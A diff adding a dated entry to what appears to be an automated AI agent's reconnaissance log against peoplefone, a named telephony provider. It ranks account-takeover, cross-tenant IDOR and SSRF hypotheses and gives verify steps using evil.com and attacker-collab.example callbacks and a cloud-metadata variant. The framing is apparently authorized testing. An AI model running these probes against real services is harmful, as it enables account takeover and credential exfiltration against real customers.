@@ -343,3 +343,52 @@ testability: AUTH_HELPED
 [LEARN] REJECTED AUTH @ auth.peoplefone.com: re-confirmed token issuance outside all 8 specs and standard endpoints 404 — agent-side token acquisition impossible; human+portal required
 [LEARN] REJECTED MISCONFIG @ *.peoplefone.com: no new dangling-target candidates; wildcard remains Cloudflare CNAME-dominated
 [RISK] peoplefone GmbH: 89/100 — all three CRITICAL/HIGH hypothesis classes remain live but unverified behind a single auth gate; extensive 8-spec API surface exposing SIP creds, PII, DID routing, call-forwarding/IVR/queue state; 5 SSRF endpoints with a header-exfiltration variant; deprecated 2026-09-30 API still exposed; overall impact is entirely gated on token acquisition that no agent path can obtain, so confirmation is deferred to the authorized operator step.
+## 2026-09-05 00:15:57 UTC [target] (model bigpickle)
+[NEW] auth.peoplefone.com/oauth/authorize is LIVE for client_id=1: `GET /oauth/authorize?...redirect_uri=https://evil.com/callback...` → HTTP 302 → `/de_CH/login` with the attacker `redirect_uri` PRESERVED verbatim — prior KB "404 at standard paths" was an invalid-client artifact (`client_id=test` → 404); the endpoint validates client_id but NOT redirect_uri
+[NEW] Implicit (`response_type=token`) AND PKCE (`code_challenge`+`code_challenge_method=S256`) params accepted and preserved through the same redirect → public-client-style behavior
+[NEW] auth.peoplefone.com/oauth/token EXISTS (HTTP 405 on GET) — live token-exchange endpoint confirmed
+[NEW] auth.peoplefone.com/de_CH/register is LIVE (HTTP 200, `registrationForm` POST + Cloudflare Turnstile sitekey `0x4AAAAAAETtGmlFEOhYOX2V`) — self-service account creation available to an authorized operator
+[NEW] portal.peoplefone.ch inventoried: LIVE Laravel customer portal (XSRF-TOKEN + encrypted session cookie, httponly, secure) — `302 /` → `/home` → `/login` → `auth.peoplefone.com/oauth/authorize?client_id=1&redirect_uri=portal.peoplefone.ch/authback&state=` — token-issuance chain now precisely mapped; root `/api` → 404
+[NEW] `/services/api-doc/swagger-initializer.js` confirms exactly 8 specs, NO auth/token spec (token issuance confirmed off-spec, via portal OAuth flow)
+[CHANGED] REVERSED prior REJECTED-AUTH verdict: OAuth authorize endpoint confirmed live; arbitrary redirect_uri/state preserved for client_id=1 two hops deep (authorize → login); token endpoint live; full ATO-relevant primitive re-instated
+[PRIO] auth.peoplefone.com,7.95,attack_surface:8,business_value:10,tech_exposure:10,gate_ease:3,cloud_surface:5,freshness:10 — revived OAuth authorize/token surface, low structural cost to re-probe, gated only by final victim-login step
+[PRIO] portal.peoplefone.ch,7.55,attack_surface:7,business_value:10,tech_exposure:8,gate_ease:4,cloud_surface:5,freshness:10 — in-scope customer portal (Laravel) is the OAuth orchestrator and token issuer; never previously inventoried
+[PRIO] configuration-api.peoplefone.com,8.6,attack_surface:10,business_value:10,tech_exposure:9,gate_ease:4,cloud_surface:7,freshness:9 — unchanged, remains token-gated
+[HYP] OAuth arbitrary redirect_uri / implicit-token theft on auth service (client_id=1)
+class: AUTH
+asset: auth.peoplefone.com/oauth/authorize (+ /oauth/token)
+confidence: 78
+reasoning: Live 302 observed: authorize with `redirect_uri=https://evil.com/callback` preserves evil.com through `/de_CH/login`; implicit response_type=token and PKCE code_challenge both accepted and preserved (302 observed today); `/oauth/token` returns 405=exists; client_id=1 (portal web client) is the acting client; no client-secret needed at the authorize layer
+evidence_needed: After a real victim authentication via attacker-crafted authorize URL, the code (or token under implicit) is delivered to the attacker redirect_uri AND exchangeable at /oauth/token — determines ATO (public/PKCE) vs open-redirect+login-CSRF (confidential secret required)
+verify_steps: (authorized op, test account) replicate today's 302 repro, complete login, capture code at attacker-URL; POST the code to /oauth/token with and without client_secret; observe token issuance
+impact: If exchange is public-client-capable: full ATO of any authenticated portal user → call recordings, CDR, PBX config, billing; minimum guaranteed: open redirect primed on a login flow + login-CSRF; severity CRITICAL (conditional on client type)
+testability: HUMAN_ONLY
+[HYP] IDOR/BOLA on Configuration API {identifier} CRUD across 8 resource types
+class: IDOR
+asset: configuration-api.peoplefone.com/customer/voip/v1/{users,groups,ivrs,queues,numbers,smart-routings,callforwarding,manual-routing}/{identifier}
+confidence: 85
+reasoning: unchanged — 235KB spec, numeric sequential identifiers, boundary statement in spec, PII in UserResponse; live 401 gate confirmed; cross-model convergence (bigpickle+nemotron3)
+evidence_needed: tenant-A token returns tenant-B {identifier} object via sequential enumeration
+verify_steps: (authorized token) GET /customer/voip/v1/users → own id space; GET /users/{own_id±1}; compare owner markers vs token tenant
+impact: cross-tenant PBX takeover — SIP creds, PII, DID routing, IVR/queue reprogramming; CRITICAL
+testability: AUTH_HELPED
+[HYP] SSRF via 5 callback-accepting endpoints incl. custom-header exfiltration
+class: SSRF
+asset: api.peoplefone.com/customer/sms/v1/sms/messages (callbackUrl) + call-api smart-routings/{id}/webhook + call-api uaCSTA device/monitorStart + configuration-api external-number-lookup (webhookUrl)
+confidence: 78
+reasoning: unchanged — 5 endpoints accept format:uri with zero host/scheme allowlist; External Number Lookup forwards customer Authorization/X-API-Key to attacker URL; uaCSTA streams call events
+evidence_needed: post-auth callback POST reaches attacker host; 169.254.169.254/loopback not filtered
+verify_steps: (authorized token) POST SMS with callbackUrl=https://attacker-collab.example/x + 169.254.169.254 variant; register Smart Routing webhook url; uaCSTA monitorStart with monitoringCallbackUrl
+impact: cloud metadata/IAM theft, internal pivot, credential + live call-metadata exfiltration; CRITICAL
+testability: AUTH_HELPED
+[PARKED] BUSLOGIC @ Queue API agent login/logout (65): retained only at lowest rank; spec-silent on membership validation; drop priority in favor of the revived, live-evidenced OAuth chain
+[FINAL] AUTH OAuth redirect_uri/implicit token theft on auth (client_id=1) — 78, HUMAN_ONLY, CRITICAL — REVIVED from REJECTED, top slot by live evidence; prove client-type at token exchange before claiming ATO
+[FINAL] IDOR configuration-api {identifier} CRUD — 85, AUTH_HELPED, CRITICAL — RETAIN (top per cross-model convergence)
+[FINAL] SSRF 5 callback endpoints — 78, AUTH_HELPED, CRITICAL — RETAIN
+[NEXT] HUMAN: In authorized scope, create a test account via the live self-service `auth.peoplefone.com/de_CH/register` (Turnstile-protected, verified 200), complete the mapped portal login (portal.peoplefone.ch → auth authorize client_id=1), then (a) determine whether `/oauth/token` exchanges a code WITHOUT client_secret (public/PKCE client = confirmed ATO, CRITICAL) and (b) use the obtained bearer token to run the two read-only IDOR confirmations `GET /customer/voip/v1/users/{own_id±1}`. All remaining top hypotheses are gated on exactly this account.
+[LEARN] ACCEPTED AUTH @ auth.peoplefone.com: authorize endpoint CONFIRMED LIVE for client_id=1 (302→/de_CH/login preserving arbitrary redirect_uri, implicit+PKCE params accepted); prior 404 verdict traced to invalid `client_id=test` artifact — correction supersedes 2026-09-04 REJECTED entries
+[LEARN] ACCEPTED AUTH @ auth.peoplefone.com: oauth/token live (405 on GET) — token-exchange endpoint exists adjacent to unrestricted redirect_uri; final severity turns on client type (secret vs PKCE/public)
+[LEARN] ACCEPTED AUTH @ portal.peoplefone.ch: in-scope customer portal inventoried; Laravel (XSRF-TOKEN + encrypted session cookie); /→/home→/login→auth authorize chain is the sole token-issuance route; /api 404 on root
+[LEARN] ACCEPTED OTH @ api.peoplefone.com: swagger-initializer.js lists exactly 8 specs, moving all token/passport/session issuance firmly OFF-spec — OAuth URI flow is the only documented credential path
+[LEARN] REJECTED MISCONFIG @ *.peoplefone.com: unchanged — no new dangling-target candidates; wildcard remains Cloudflare CNAME-dominated
+[RISK] peoplefone GmbH: 91/100 — The single highest-impact chain is now live-evidenced: an unauthenticated attacker can craft an authorize URL with arbitrary redirect_uri and implicit/PKCE grants against client_id=1; if the portal client is public-client capable, this is silent ATO over the real customer portal (billings, recordings, PBX data, PII) plus a guaranteed open-redirect/login-CSRF primitive otherwise. All three API hypothesis classes (IDOR 85, SSRF 78, BUSLOGIC 65) remain live behind one token gate that an authorized operator can now open via the verified public `de_CH/register` endpoint. Probe results and corrected OAuth repro appended to probe-results.md.
